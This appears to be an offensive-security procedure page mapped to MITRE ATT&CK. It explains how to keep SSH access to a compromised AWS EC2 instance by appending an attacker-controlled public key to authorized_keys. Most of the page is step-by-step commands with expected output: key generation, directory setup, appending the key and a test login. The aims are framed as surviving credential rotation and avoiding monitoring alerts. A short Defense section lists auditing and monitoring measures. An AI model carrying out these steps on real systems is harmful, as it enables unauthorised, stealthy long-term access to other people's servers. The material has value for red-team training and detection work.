---
id: dc7ffca2-360c-4736-8254-a5b742ae9a54
name: aws-ssh-persistence-via-authorized-keys
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:13.652166+00:00'
updated_at: '2023-04-10T20:20:48.483307+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Account Manipulation|T1098 - Account Manipulation]]'
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
sub_techniques:
  - '[[sub-techniques/SSH Authorized Keys|T1098.004 - SSH Authorized Keys]]'
  - '[[sub-techniques/Cloud Accounts|T1078.004 - Cloud Accounts]]'
tags:
  - '[[tags/Cloud - AWS]]'
  - '[[tags/Persistence]]'
  - '[[tags/SSH]]'
commands:
  - '[[commands/add-public-key-to-authorized-keys]]'
platforms:
  - AWS
  - Linux
tools: []
validated: true
---

# aws-ssh-persistence-via-authorized-keys

## Summary

This procedure demonstrates how to establish persistent SSH access to a compromised AWS EC2 instance by appending an attacker-controlled public key to the target's authorized_keys file. This allows future logins without relying on original credentials, even if they are rotated or revoked, making it a common persistence technique in cloud environments.

## Description

In AWS environments, EC2 instances often use SSH for remote access, with authentication managed via public-private key pairs stored in the ~/.ssh/authorized_keys file. Once initial access is gained (e.g., via exploited credentials or another vector), an attacker can modify this file to include their own public key. This grants persistent shell access as the target user, bypassing password changes or key rotations at the instance level. The technique is stealthy if the key is not monitored and aligns with cloud-specific persistence methods. It requires write access to the user's .ssh directory and assumes a Linux-based instance, common in AWS. Success enables repeated logins from the attacker's private key without triggering credential-based alerts.

## Requirements

1. Initial shell access to the target AWS EC2 instance (e.g., via SSH with existing credentials or RCE).
2. Write permissions to the target user's ~/.ssh/authorized_keys file (typically requires user-level access or sudo).
3. An attacker-generated SSH key pair, with the public key ready to inject.
4. The instance must have SSH service running on port 22 (default).

## Defense

- Regularly audit and rotate SSH authorized_keys files using automated scripts or AWS Config rules to detect unauthorized additions.
- Implement least-privilege access: Use IAM roles instead of key-based SSH where possible, and enforce MFA for console access.
- Monitor CloudTrail logs for unauthorized SSH key uploads or instance metadata changes, and enable SSH logging with tools like fail2ban or AWS GuardDuty for anomaly detection in login patterns.
- Restrict .ssh directory permissions (chmod 700) and scan for unexpected keys during security assessments.

## Objectives

1. Inject an attacker-controlled public SSH key into the target's authorized_keys file to enable persistent access.
2. Ensure the modification survives instance reboots and credential changes.
3. Verify the new key allows SSH login without alerting monitoring systems.

## Instructions

### Step 1: Generate Attacker SSH Key Pair

**Context**: Before accessing the target, create a new SSH key pair on your attacker machine if you don't have one. This ensures you have the public key to inject and the private key for future logins.

Run the following on your local machine:

```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/aws_persistence_key
```

> This generates a private key (aws_persistence_key) and public key (aws_persistence_key.pub). Copy the contents of the public key file for the next step. Expected output: Key pair files created without passphrase for automation.

### Step 2: Access the Target Instance and Locate Authorized Keys

**Context**: Gain shell access to the EC2 instance and navigate to the user's .ssh directory. Ensure the directory exists; create it if necessary to avoid permission issues.

If .ssh doesn't exist:

**Command** ([[commands/create-ssh-directory]]):
```bash
mkdir -p /home/user/.ssh && chmod 700 /home/user/.ssh
```

> This creates the .ssh directory with proper permissions (owner-only read/write/execute). Expected output: Directory created, no errors if already exists.

Check if authorized_keys exists:

**Command** ([[commands/check-authorized-keys]]):
```bash
ls -la /home/user/.ssh/authorized_keys
```

> Lists the file if present. Expected output: File details or "No such file" if new.

### Step 3: Append the Public Key

**Context**: Append your public key to the authorized_keys file. Replace placeholders with actual values: use the target username (e.g., ec2-user, ubuntu) and your public key content.

**Command** ([[commands/add-public-key-to-authorized-keys]]):
```bash
echo "ssh-rsa YOUR_PUBLIC_KEY_HERE comment" >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys
```

> The echo command appends the key (format: ssh-rsa [key] [optional comment]). The chmod ensures secure permissions (owner read/write only). Expected output: No stdout, but verify with cat /home/user/.ssh/authorized_keys to see the appended key.

### Step 4: Verify Persistence

**Context**: Test the new key by attempting an SSH login from your attacker machine using the private key. This confirms the persistence without disrupting the current session.

From your local machine:

```bash
ssh -i ~/.ssh/aws_persistence_key user@target_instance_ip
```

> Expected output: Successful shell prompt without password prompt. If it fails, check key format, permissions, or AWS security groups allowing SSH from your IP.
